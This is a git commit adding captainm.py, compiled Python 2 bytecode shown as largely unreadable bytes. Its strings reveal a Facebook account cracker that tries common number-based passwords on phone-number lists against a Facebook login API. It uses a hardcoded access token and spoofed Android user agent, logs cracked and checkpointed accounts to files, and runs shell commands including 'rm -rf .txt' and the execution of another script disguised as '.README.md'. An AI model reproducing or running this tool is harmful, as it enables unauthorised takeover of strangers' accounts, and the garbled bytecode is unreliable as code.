59366c2ce1e9a4a451e071ef13beb4796cc5c268
kurdteam1 <81302709+kurdteam1@users.noreply.github.com>
2021-03-29 04:49:09 +0300

    Rename profiss0r.py to captainm.py

---
+++ captainm.py
@@ -0,0 +1,102 @@
+ó
+ÿc@sªeZer#ddZZnddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZddl
+Z
+ddlZejdxJedD]<ZejddZedde_eGHejjqÍWyddlZWnek
+r=ejd	nXyddlZWn8ek
+rejd
+ejdejdnXdd
+lmZddlmZddlmZe eej!dejZ"e"j#ee"j$ej%j&dddge"_'dZ(dZ)dZ*dZ+dZ,Z,dZ-gZ.ga/ga0gZ1dZ2dZ3ddlZddl4Z4dZ5e6dkr¦e2ndS(iiÿÿÿÿNsrm -rf .txti iGôis.txttaspip2 install requestsspip2 install mechanizeispython2 nmbr.py(t
+ThreadPool(tConnectionError(tBrowsertutf8tmax_times
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]cCsdGHtjjdS(Ns[!] Exit(tostsystexit(((s
+843845054o.pytexb#scCsCx<|dD]0}tjj|tjjtjdqWdS(Ntg¸ëQ¸?(Rtstdouttwritetflushttimetsleep(tzte((s
+843845054o.pytpsb(s
+cCstjddS(Ni(RR(((s
+843845054o.pytt/scCstjddS(Ntclear(Rtsystem(((s
+843845054o.pytcb3ssA
+𝐂𝐀𝐏𝐓𝐀𝐈𝐍𖥖
+===============================================================
+cCs4tjdtGHddGHdGHddGHtdS(NRi*t=s#[1] KURDISTAN | [Up]Cracker Number (RRtlogotaction(((s
+843845054o.pytmenuHs
+		csÝtd}|dkr'dGHtnÁ|dkrÆtjdtGHdGHyOtddd}x0t|d	jD]}tj|j	q{WWqèt
+k
+rÂd
+GHtdtqèXn"|dkrÜtnd
+GHtt
+tt}td|tjdtdtjdtdtjdddGHfd}td}|j|tddGHdGHdt
+ttdt
+ttGHdGHtdtjdddl}dS(NsSelect Option  R
+s[!] Fill in correctlyt1Rs0770, 0750, 0773, 0751s Zhmarayak Dane  : s.txttrs[!] File Not Founds[ Back ]t0s[!] Fill Ba Kalk Nayas Hamw Raqamakan: g¹?s, Tkaya Chawarwan Ba ...                     sB[!] Bo Wastan Dni Toolaka CTRL+Z                                  gà?i*Rc
+s!|}ytjdWntk
+r*nXyè|}tjd|d|d}tj|}d|kråd|d|ddGHtd	d
+}|j|d||jt	j
+||nd|dkrdd
+|d|dGHtdd
+}|j|d|d|jtj
+||nd}tjd|d|d}tj|}d|krd|d|ddGHtd	d
+}|j|d|d|jt	j
+||nd|dkrd
+|d|dGHtdd
+}|j|d|d|jtj
+||nd}tjd|d|d}tj|}d|krYd|d|ddGHtd	d
+}|j|d|d|jt	j
+||nd|dkrØd
+|d|dGHtdd
+}|j|d|d|jtj
+||nd}	tjd|d|	d}tj|}d|krd|d|	ddGHtd	d
+}|j|d|	d|jt	j
+||	nd|dkrd
+|d|	dGHtdd
+}|j|d|	d|jtj
+||	nWnnXdS(Ntsaveshttps://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmtaccess_tokens[[1;92msuccessfull] t R
+ssave/successfull.txtRswww.facebook.comt	error_msgs
+[checkpoint] ssave/checkpoint.txtt
+1122334455t
+1234554321t112233445566(RtmkdirtOSErrortbrtopentjsontloadRtclosetokstappendtcpb(
+targtusertpass1tdatatqtokbtcpstpass2tpass3tpass4(tctk(s
+843845054o.pytmainus
+'!
+!
+'!!
+!
+'!!
+!
+'!!
+!
+is&[1;93m Process Has Been Completed ....s Total OK/[1;96mCP : t/s- CP File Has Been Saved : save/checkpoint.txts[Press Enter To Go Back]spython2 .README.mdiÿÿÿÿ(t	raw_inputRRRRR(t	readlinestidR-tstriptIOErrorRR	tstrtlenRRRRtmapR,R.R(tbchtidlisttlinetxxxR;tpR((R9R:s
+843845054o.pyRQsP
+
+
+
+
+
+
+
+
+
+	J	)
+
+cCs¦ttjttj}dj|}d|GHtjdj}||krdGHttj}tj	dt
+ndGHtj	dtjdS(Nt-s[37;1mYour ID : s!https://pastebin.com/raw/2FCBfYXJs [37;1mYOUR ID IS ACTIVE.........is$[37;1mYOUR ID IS NOT ACTIVE.........(
+RBRtgeteuidtgetlogintjointrequeststgetttextRRthackRR(tuuidR?thttpCahttmsg((s
+843845054o.pythamaËs"	
+
+
+t__main__(s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](7tFalsetfootbarRRRtdatetimetrandomthashlibtret	threadingR)turllibt	cookielibtgetpassRtrangetntrandinttnmbrR(RR
+RNtImportErrort	mechanizeRtmultiprocessing.poolRtrequests.exceptionsRRtreloadtsetdefaultencodingR'tset_handle_robotstset_handle_refresht_httptHTTPRefreshProcessort
+addheadersR	RRRRtbackt
+successfulR.R,R?RRRRRUt__name__(((s
+843845054o.pyt<module>s\
+
+
+
+
+
+
+
+
+
+				
+			w	
